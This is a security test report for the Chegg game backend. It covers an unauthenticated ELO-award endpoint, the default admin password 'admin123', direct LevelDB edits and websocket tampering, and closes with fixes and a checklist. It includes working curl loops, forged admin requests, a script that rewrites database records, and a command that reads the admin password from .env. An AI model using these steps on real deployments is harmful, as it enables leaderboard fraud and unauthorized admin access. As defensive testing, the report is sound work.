# Security Test Report - Chegg Game

## Overview
This document outlines testable vulnerabilities in the Chegg backend that allow mana manipulation during gameplay and leaderboard/ELO manipulation.

---

## Vulnerability Tests

### Test 1: AI Win Endpoint - No Token Validation ⚠️ CRITICAL

**Location:** `server/index.js` line 354-395  
**Endpoint:** `POST /api/player/:username/ai-win`

**Vulnerability:** The endpoint accepts AI match results without validating player token, allowing anyone to award themselves fake ELO.

**Test Steps:**
```bash
# Before running test, start server:
npm start

# In another terminal, run:
curl -X POST http://localhost:1109/api/player/testuser/ai-win \
  -H "Content-Type: application/json" \
  -d '{"winner": "player"}'

# Expected Result (VULNERABLE):
# Response: 200 OK with newElo increased
# Should reject because no token in playerData
```

**Expected Vulnerable Response:**
```json
{
  "success": true,
  "newElo": 1240,
  "diff": 40,
  "botElo": 760
}
```

**Proof of Concept - Repeated Abuse:**
```bash
# Run this 10 times in a loop - attacker gains +400 ELO easily
for i in {1..10}; do
  curl -s -X POST http://localhost:1109/api/player/cheater001/ai-win \
    -H "Content-Type: application/json" \
    -d '{"winner": "player"}' | jq .newElo
done
```

**Impact:** 
- ✅ Can award any username fake wins
- ✅ Can boost any player's ELO to rank 1
- ✅ No authentication required
- ✅ Rate limit (10 per 60s) is insufficient

---

### Test 2: Leaderboard Reflection Attack

**Location:** `server/index.js` line 155-185  
**Endpoint:** `GET /api/leaderboard`

**Vulnerability:** Leaderboard is built from database directly with no validation.

**Test Steps:**
```bash
# First, get initial leaderboard
curl -s http://localhost:1109/api/leaderboard | jq '.players[0]'

# Make requests using Test 1 to boost ELO
# Then check leaderboard again
curl -s http://localhost:1109/api/leaderboard | jq '.players[] | select(.username=="cheater001")'
```

**Expected Result:**
Fake player appears at top of leaderboard after using `/ai-win` exploit.

---

### Test 3: Admin Password Exposure

**Location:** `server/index.js` line 19-20  
**Code:**
```javascript
const ADMIN_PASSWORD = (process.env.ADMIN_PASSWORD || 'admin123').replace(/^["']|["']$/g, '');
```

**Vulnerabilities:**
1. Default password is `admin123`
2. Read from plaintext `.env` file
3. If `.env` is committed or exposed, full admin access is compromised

**Test Steps:**
```bash
# Check if .env exists and what password is set
cat .env | grep ADMIN_PASSWORD

# If default or weak password, try admin auth:
curl -X POST http://localhost:1109/api/admin/auth \
  -H "Content-Type: application/json" \
  -d '{"password": "admin123"}'

# Expected Result (if vulnerable):
{
  "success": true,
  "token": "abc123def456...",
  "message": "Authentication successful"
}

# Now use token to create fake players or modify ELO:
curl -X POST http://localhost:1109/api/admin/player \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "fake_rank1",
    "elo": 5000,
    "wins": 1000,
    "losses": 0,
    "force": true
  }'
```

**Impact:**
- ✅ Full account creation/modification
- ✅ Arbitrary ELO assignment
- ✅ Delete any player

---

### Test 4: Direct Database Manipulation

**Location:** `./db/chegg-games/` (LevelDB directory)

**Vulnerability:** Database is stored as plaintext LevelDB files on disk.

**Test Steps:**
```bash
# If you have direct file access:
ls -la ./db/chegg-games/

# Using node-leveldb or direct file manipulation:
# Database structure: key=`user:<username>`, value=JSON

# Example: Create testfile.js
cat > /tmp/db_test.js << 'EOF'
import { Level } from 'level';

const db = new Level('./db/chegg-games', { valueEncoding: 'json' });

// Get current data
const data = await db.get('user:testuser');
console.log('Before:', data);

// Directly modify
data.elo = 9999;
data.wins = 5000;
data.losses = 0;
await db.put('user:testuser', data);

const updated = await db.get('user:testuser');
console.log('After:', updated);

await db.close();
EOF

# Run it
node /tmp/db_test.js
```

**Impact:**
- ✅ Complete leaderboard manipulation
- ✅ No logs/audit trail
- ✅ Instant changes

---

### Test 5: Client-Side Mana UI Spoofing (LOW RISK - Server Blocks)

**Location:** Browser console during live game

**Test Steps:**
```javascript
// In browser console during a game:
gameState.players.blue.mana = 999;
// UI updates to show 999 mana

// Try to spawn expensive card
// Expected: Server rejects because it has real mana value
```

**Result:** 
- ❌ Not exploitable (server validates)
- Server maintains authoritative game state
- UI changes don't affect actual game logic

---

### Test 6: WebSocket Message Tampering (MEDIUM RISK)

**Location:** Browser network tab or WebSocket proxy

**Test Steps:**
1. Open DevTools → Network → WS filter
2. Start a game to see WebSocket connection
3. Use tool like `Burp Suite` or `mitmproxy` to intercept WebSocket frames
4. Modify action payload:
```json
// Original:
{"event": "action", "payload": {"type": "SPAWN_MINION", "cardIndex": 0, "row": 0, "col": 0}}

// Modified to spawn without paying cost:
{"event": "action", "payload": {"type": "SPAWN_MINION", "cardIndex": 0, "row": 0, "col": 0, "mana": 999}}
```

**Expected Result:**
- Server validates mana on its side
- Rejects action if cost exceeds actual mana
- ❌ Not reliably exploitable

---

## Severity Rankings

| Vulnerability | Severity | Exploitability | Impact | 
|---|---|---|---|
| `/api/player/:username/ai-win` no auth | 🔴 **CRITICAL** | ⭐⭐⭐⭐⭐ Easy | Full leaderboard takeover |
| Admin password weak/exposed | 🔴 **CRITICAL** | ⭐⭐⭐⭐ Easy | Complete system compromise |
| Direct DB access | 🔴 **CRITICAL** | ⭐⭐⭐ Medium | Permanent manipulation |
| Client mana UI spoofing | 🟢 **LOW** | ⭐⭐ Hard | Server blocks |
| WebSocket tampering | 🟡 **MEDIUM** | ⭐⭐⭐ Medium | Server validates mostly |

---

## Recommended Fixes

### Priority 1 (Immediate)
1. Remove `/api/player/:username/ai-win` or add strict token validation
2. Change admin password, store securely (hash + salt or env var)
3. Implement database encryption at rest

### Priority 2 (Short Term)
1. Add comprehensive action validation on server
2. Implement game state checksums to detect tampering
3. Add audit logging for all DB modifications

### Priority 3 (Medium Term)
1. Implement WebSocket signature verification
2. Add rate limiting per user/session
3. Use JWT tokens with expiration for sensitive endpoints

---

## Testing Checklist

- [ ] Test 1: AI Win endpoint accepts requests without auth
- [ ] Test 2: Verify fake players appear on leaderboard
- [ ] Test 3: Admin password is vulnerable
- [ ] Test 4: Database can be directly modified
- [ ] Test 5: Client-side mana changes are blocked server-side
- [ ] Test 6: WebSocket messages are validated server-side

